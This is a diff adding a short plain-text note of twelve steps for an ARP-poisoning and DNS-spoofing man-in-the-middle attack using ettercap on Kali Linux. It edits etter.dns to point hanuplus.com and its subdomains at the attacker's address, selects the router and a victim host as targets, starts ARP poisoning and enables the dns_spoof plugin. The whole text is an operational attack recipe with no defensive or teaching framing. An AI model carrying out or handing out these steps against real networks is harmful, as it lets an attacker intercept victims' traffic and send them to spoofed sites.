@@ -1,0 +1,24 @@
+step 1=> find ip on kali ->ifconfig
+step 2=>~#leafpad /etc/ettercap/etter.dns
+
+#microsoft sucks;)
+#redirect it to www.linux.org
+#
+hanuplus.com  A 192.168.1.100
+*.hanuplus.com A 192.168.1.100
+(remove) www.microsoft.com PTR ip
+
+step 3=>ettercap -G
+step 4=> sniff->unified sniffing->ettercap input 
+		network interface (eth0/wlan0)
+step 5=>start->stop sniffing
+step 6=> targets->current targets
+step 7=> hosts->scan for hosts
+step 8=> hosts->host list
+step 9=> click router ip and add to target 2
+	sec. click victom ip and add to target 1
+step 10=> mitm->ARP poisoning
+        click right aniff remote connection
+step 11=>plugins ->mange the plugins->dns_spoof
+step 12=> start ->startsniffing
+
